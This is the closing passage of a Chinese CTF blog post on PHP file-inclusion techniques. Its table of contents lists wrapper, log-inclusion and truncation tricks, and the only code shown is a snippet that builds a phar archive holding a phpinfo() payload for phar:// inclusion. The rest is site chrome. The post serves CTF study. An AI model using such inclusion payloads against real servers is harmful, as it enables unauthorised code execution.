+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$p = new PharData(dirname(__FILE__).&apos;./test.123&apos;, 0,&apos;test&apos;,Phar::ZIP);</span><br><span class="line">	$p-&gt;addFromString(&apos;test.txt&apos;, &apos;&lt;?php phpinfo();?&gt;&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Fany</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://fanygit.github.io/2021/10/23/CTF-Web【文件包含】漏洞做题姿势积累/" title="CTF-Web【文件包含】漏洞做题姿势积累">https://fanygit.github.io/2021/10/23/CTF-Web【文件包含】漏洞做题姿势积累/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/总结/" rel="tag"># 总结</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/10/22/[网鼎杯2018]Unfinish 1/" rel="next" title="BUUCTF-WEB [网鼎杯2018]Unfinish 1">
+                <i class="fa fa-chevron-left"></i> BUUCTF-WEB [网鼎杯2018]Unfinish 1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/10/23/2021年“绿盟杯”重庆市大学生信息安全竞赛部分wp/" rel="prev" title="2021年“绿盟杯”重庆市大学生信息安全竞赛部分wp">
+                2021年“绿盟杯”重庆市大学生信息安全竞赛部分wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+  
+    
+    <div class="comments" id="comments"></div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  
+    <img class="site-author-image" itemprop="image" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/images/tx5.gif" alt="Fany">
+  
+  <p class="site-author-name" itemprop="name">Fany</p>
+  <div class="site-description motion-element" itemprop="description">路虽远，行则必达。</div>
+</div>
+
+
+  <nav class="site-state motion-element">
+    
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">114</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">68</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+
+
+
+
+  <div class="links-of-author motion-element">
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/fanygit" title="GitHub &rarr; https://github.com/fanygit" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:483813121@qq.com" title="E-Mail &rarr; mailto:483813121@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+
+
+
+  <div class="cc-license motion-element" itemprop="license">
+  
+  
+    
+  
+  
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+
+  <div class="links-of-blogroll motion-element links-of-blogroll-block">
+    <div class="links-of-blogroll-title">
+      <i class="fa  fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://leancloud.cn/dashboard/applist.html#/apps" title="https://leancloud.cn/dashboard/applist.html#/apps" rel="noopener" target="_blank">Leancloud</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.leavesongs.com/" title="https://www.leavesongs.com/" rel="noopener" target="_blank">P牛</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://drun1baby.github.io/" title="https://drun1baby.github.io/" rel="noopener" target="_blank">崖余</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+          
+          
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php常见文件包含函数"><span class="nav-number">2.</span> <span class="nav-text">php常见文件包含函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含漏洞的利用"><span class="nav-number">3.</span> <span class="nav-text">文件包含漏洞的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php伪协议"><span class="nav-number">3.1.</span> <span class="nav-text">php伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php-input（allow-url-include-On）"><span class="nav-number">3.1.1.</span> <span class="nav-text">php://input（allow_url_include=On）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-filter"><span class="nav-number">3.1.2.</span> <span class="nav-text">php://filter</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#data"><span class="nav-number">3.1.3.</span> <span class="nav-text">data://</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#zip"><span class="nav-number">3.1.4.</span> <span class="nav-text">zip://</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#phar"><span class="nav-number">3.1.5.</span> <span class="nav-text">phar://</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#包含日志文件"><span class="nav-number">3.2.</span> <span class="nav-text">包含日志文件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#日志和配置文件默认存放路径"><span class="nav-number">3.2.1.</span> <span class="nav-text">日志和配置文件默认存放路径</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#session常见存储路径"><span class="nav-number">3.2.2.</span> <span class="nav-text">session常见存储路径</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#包含系统文件"><span class="nav-number">3.3.</span> <span class="nav-text">包含系统文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过"><span class="nav-number">4.</span> <span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#过滤read、resource"><span class="nav-number">4.0.1.</span> <span class="nav-text">过滤read、resource</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#过滤"><span class="nav-number">4.0.2.</span> <span class="nav-text">过滤 ../</span></a></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#截断包含"><span class="nav-number">5.</span> <span class="nav-text">截断包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用截断包含-绕过拼接后缀名"><span class="nav-number">5.1.</span> <span class="nav-text">使用截断包含 绕过拼接后缀名</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#00截断"><span class="nav-number">5.1.1.</span> <span class="nav-text">00截断</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#长目录名截断"><span class="nav-number">5.2.</span> <span class="nav-text">长目录名截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar-php-gt-5-3-0起"><span class="nav-number">5.3.</span> <span class="nav-text">phar://(php&gt;5.3.0起)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#制作phar文件（php5-3之后）"><span class="nav-number">5.4.</span> <span class="nav-text">制作phar文件（php5.3之后）</span></a></li></ol></li></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2025</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Fany</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.2.0</div>
+
+
+
+
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>  Sometimes your whole life boils down to one insame move.
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("07/28/2019 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+
+
+  <script src="/js/utils.js?v=7.2.0"></script>
+
+  <script src="/js/motion.js?v=7.2.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.2.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.2.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.2.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  
+    
+  
+
+  
+
+  
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.2.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'pbe8vhO6luYrD6pclzm8NQST-gzGzoHsz',
+    appKey: 'sKqLiA3nL8BojxzmOL3HCdGO',
+    placeholder: '非常希望您能留下宝贵的意见！',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn'
+  });
+</script>
+
+  
+<!--   <link rel="stylesheet" href="https://github.com/fanygit/dist/raw/master/APlayer.min.css">
+<div id="aplayer"></div>
+<script type="text/javascript" src="https://github.com/fanygit/dist/raw/master/APlayer.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/fanygit/dist/master/music.js"></script> -->
+
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
+</html>
